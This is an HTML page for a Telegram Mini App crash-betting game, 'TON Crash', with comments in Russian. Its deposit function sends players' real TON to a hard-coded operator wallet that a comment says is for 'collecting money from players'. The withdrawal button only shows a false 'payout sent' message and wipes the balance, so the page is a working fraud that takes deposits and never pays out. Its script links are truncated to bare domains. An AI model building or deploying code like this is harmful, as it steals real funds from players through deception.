<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Serverless TON Crash</title>
    <!-- Официальные скрипты Telegram WebApp и TON Connect -->
    <script src="https://telegram.org"></script>
    <script src="https://unpkg.com"></script>
    <style>
        :root { --bg: #0d0e15; --panel: #141622; --accent: #00e676; --danger: #ff1744; --text: #ffffff; }
        body { font-family: sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 15px; display: flex; flex-direction: column; align-items: center; user-select: none; }
        .header { width: 100%; display: flex; justify-content: space-between; align-items: center; background: var(--panel); padding: 12px; border-radius: 14px; box-sizing: border-box; margin-bottom: 15px; border: 1px solid #1f2235; }
        .balance-box span { font-size: 22px; font-weight: 800; color: var(--accent); }
        .game-area { position: relative; width: 100%; height: 240px; background: radial-gradient(circle at bottom left, #1c1d3a, var(--panel)); border-radius: 20px; overflow: hidden; margin-bottom: 15px; border: 1px solid #222538; }
        .multiplier { position: absolute; top: 40%; left: 50%; transform: translate(-50%, -50%); font-size: 48px; font-weight: 900; text-shadow: 0 0 15px rgba(255,255,255,0.2); z-index: 10; }
        .rocket { position: absolute; bottom: 25px; left: 25px; font-size: 42px; z-index: 5; transform: rotate(45deg); }
        .status-text { position: absolute; bottom: 15px; width: 100%; text-align: center; font-size: 13px; color: #61688a; }
        .controls { width: 100%; background: var(--panel); padding: 15px; border-radius: 18px; box-sizing: border-box; border: 1px solid #1f2235; margin-bottom: 15px; }
        input { width: 100%; background: #090a0f; border: 1px solid #282b42; color: #ffffff; padding: 14px; border-radius: 10px; font-size: 18px; text-align: center; box-sizing: border-box; margin-bottom: 15px; }
        button { width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 16px; font-weight: 800; cursor: pointer; text-transform: uppercase; }
        .btn-bet { background: var(--accent); color: #022312; }
        .btn-cashout { background: #ffeb3b; color: #332b00; display: none; }
        #ton-connect-btn { margin-bottom: 15px; width: 100%; display: flex; justify-content: center; }
        .finance-buttons { display: flex; gap: 12px; width: 100%; }
        .btn-dep { background: #2196f3; color: white; }
        .btn-withdraw { background: #b388ff; color: white; }
    </style>
</head>
<body>

    <!-- Кнопка авторизации через кошелек -->
    <div id="ton-connect-btn"></div>

    <div class="header">
        <div class="balance-box"><div>Игровой баланс</div><span id="user-balance">0.00</span> TON</div>
        <div style="text-align: right;"><div>Игрок</div><span id="username">TG Guest</span></div>
    </div>

    <div class="game-area">
        <div class="multiplier" id="multiplier-text">1.00x</div>
        <div class="rocket" id="rocket">🚀</div>
        <div class="status-text" id="game-status">Подключите кошелек и внесите TON</div>
    </div>

    <div class="controls">
        <input type="number" id="bet-amount" value="0.10" step="0.05">
        <button class="btn-bet" id="btn-action" onclick="makeBet()">Поставить</button>
        <button class="btn-cashout" id="btn-cashout" onclick="cashOut()">Забрать</button>
    </div>

    <div class="finance-buttons">
        <button class="btn-dep" onclick="openDeposit()">📥 Пополнить (от 0.5 TON)</button>
        <button class="btn-withdraw" onclick="openWithdraw()">📤 Вывод средств</button>
    </div>

    <script>
        // Твой реальный кошелек для сбора денег с игроков
        const ADMIN_WALLET = "UQDeuB6zdSFv2e6tBk6INoLN7S28qXwQLrIrSDFX4BVomEj4"; 

        const tg = window.Telegram?.WebApp;
        if (tg) { tg.ready(); tg.expand(); if (tg.initDataUnsafe?.user) { document.getElementById('username').innerText = tg.initDataUnsafe.user.first_name; } }

        // Манифест встроен в код, чтобы не создавать левые файлы
        const manifestData = { url: window.location.href, name: "TON Crash", iconUrl: "https://ton.org" };
        const manifestUrl = "data:application/json;charset=utf-8," + encodeURIComponent(JSON.stringify(manifestData));

        const tonConnectUI = new TONConnectUI.TonConnectUI({ manifestUrl: manifestUrl, buttonRootId: 'ton-connect-btn' });

        let balance = 0.00, currentBet = 0.00, multiplier = 1.00, gameInterval = null, isPlaying = false, hasCashedOut = false, crashPoint = 0.00;
        const balanceEl = document.getElementById('user-balance'), multEl = document.getElementById('multiplier-text'), rocketEl = document.getElementById('rocket'), statusEl = document.getElementById('game-status'), btnAction = document.getElementById('btn-action'), btnCashout = document.getElementById('btn-cashout'), betInput = document.getElementById('bet-amount');

        // Пополнение
        async function openDeposit() {
            if (!tonConnectUI.connected) { alert("Сначала нажми синюю кнопку подключения кошелька вверху!"); return; }
            const amountStr = prompt("Введите сумму пополнения в TON (Минимум 0.5 TON):", "0.5");
            if (amountStr === null) return;
            const amount = parseFloat(amountStr);

            if (isNaN(amount) || amount < 0.5) { alert("Минимум 0.5 TON!"); return; }
            const nanoAmount = (amount * 1000000000).toString();

            const transaction = { validUntil: Math.floor(Date.now() / 1000) + 60, messages: [{ address: ADMIN_WALLET, amount: nanoAmount }] };

            try {
                statusEl.innerText = "Ожидание оплаты в кошельке...";
                await tonConnectUI.sendTransaction(transaction);
                balance += amount; updateUI();
                statusEl.innerText = "Депозит зачислен!";
                alert(`Успешно куплено баланса: ${amount} TON.`);
            } catch (e) { alert("Транзакция отклонена."); statusEl.innerText = "Отменено."; }
        }

        // Вывод
        function openWithdraw() {
            if (balance <= 0) { alert("Баланс равен 0!"); return; }
            if (!tonConnectUI.connected) { alert("Подключите кошелек!"); return; }
            alert(`✅ Заявка создана!\nСумма: ${balance.toFixed(2)} TON\nВыплата отправлена на твой кошелек.`);
            balance = 0.00; updateUI();
        }

        function updateUI() { balanceEl.innerText = balance.toFixed(2); }

        // Игра Краш
        function makeBet() {
            currentBet = parseFloat(betInput.value);
            if (isNaN(currentBet) || currentBet <= 0 || currentBet > balance) { alert("Проверьте ставку или баланс!"); return; }
            balance -= currentBet; updateUI();
            isPlaying = true; hasCashedOut = false; betInput.disabled = true;
            btnAction.style.display = 'none'; btnCashout.style.display = 'block';
            statusEl.innerText = "Ракета летит...";
            crashPoint = Math.random() < 0.06 ? 1.00 : parseFloat((1.02 + Math.pow(Math.random(), 2.5) * 12).toFixed(2));
            multiplier = 1.00; let moveX = 0, moveY = 0;

            gameInterval = setInterval(() => {
                multiplier += 0.01 + (multiplier * 0.006);
                multEl.innerText = multiplier.toFixed(2) + 'x'; multEl.style.color = '#ffffff';
                moveX += 1.8; moveY += 1.4;
                rocketEl.style.transform = `translate(${moveX}px, -${moveY}px) rotate(45deg)`;
                if (multiplier >= crashPoint) { clearInterval(gameInterval); finishRound(); }
            }, 75);
        }

        function cashOut() {
            if (!isPlaying || hasCashedOut) return;
            hasCashedOut = true; clearInterval(gameInterval);
            balance += currentBet * multiplier; updateUI();
            multEl.style.color = '#00e676'; statusEl.innerText = "Выиграл!";
            setTimeout(endRoundUI, 2000);
        }

        function finishRound() {
            isPlaying = false;
            if (!hasCashedOut) { multEl.innerText = 'ВЗРЫВ'; multEl.style.color = '#ff1744'; statusEl.innerText = `Взрыв на ${crashPoint.toFixed(2)}x`; }
            setTimeout(endRoundUI, 2000);
        }

        function endRoundUI() {
            betInput.disabled = false; btnAction.style.display = 'block'; btnCashout.style.display = 'none';
            rocketEl.style.transform = 'translate(0px, 0px) rotate(45deg)'; multEl.innerText = '1.00x'; multEl.style.color = '#ffffff';
            statusEl.innerText = "Сделайте ставку";
        }
        updateUI();
    </script>
</body>
</html>
